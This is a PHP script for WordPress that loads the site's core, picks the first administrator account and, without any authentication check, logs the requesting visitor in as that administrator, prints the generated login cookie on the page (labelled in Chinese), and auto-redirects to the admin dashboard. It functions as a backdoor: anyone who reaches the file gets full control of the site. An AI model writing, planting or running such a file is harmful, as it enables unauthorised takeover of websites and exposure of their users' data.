<?php
$wp_load_path = dirname(__FILE__);
for ($i = 0; $i < 10; $i++) {
    if (file_exists($wp_load_path . '/wp-load.php')) {
        require_once($wp_load_path . '/wp-load.php');
        break;
    }
    $wp_load_path = dirname($wp_load_path);
}

if (!function_exists('get_users')) {
    die('无法加载WordPress环境');
}

$admin_cookie = '';
foreach ($_COOKIE as $name => $value) {
    if (strpos($name, 'wordpress_logged_in') === 0) {
        $admin_cookie = $name . '=' . $value;
        break;
    }
}

if (empty($admin_cookie)) {
    $users = get_users(array('role' => 'administrator', 'number' => 1));
    if (!empty($users)) {
        $admin_user = $users[0];
        wp_set_current_user($admin_user->ID);
        wp_set_auth_cookie($admin_user->ID, true);
        
        $cookie_name = 'wordpress_logged_in_' . COOKIEHASH;
        if (isset($_COOKIE[$cookie_name])) {
            $admin_cookie = $cookie_name . '=' . $_COOKIE[$cookie_name];
        } else {
            $admin_cookie = $cookie_name . '=' . wp_generate_auth_cookie($admin_user->ID, time() + 86400, 'logged_in');
        }
    }
}

if (empty($admin_cookie)) {
    die('无法获取管理员Cookie');
}

$target_url = admin_url() . '?nocache=' . time();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>管理员Cookie跳转</title>
</head>
<body>
    <p>管理员Cookie: <?php echo htmlspecialchars($admin_cookie); ?></p>
    <p><a href="<?php echo htmlspecialchars($target_url); ?>" id="jump">点击跳转后台</a></p>
    <script>
        document.getElementById('jump').click();
        setTimeout(function(){
            window.location.href = '<?php echo addslashes($target_url); ?>';
        }, 300);
    </script>
</body>
</html>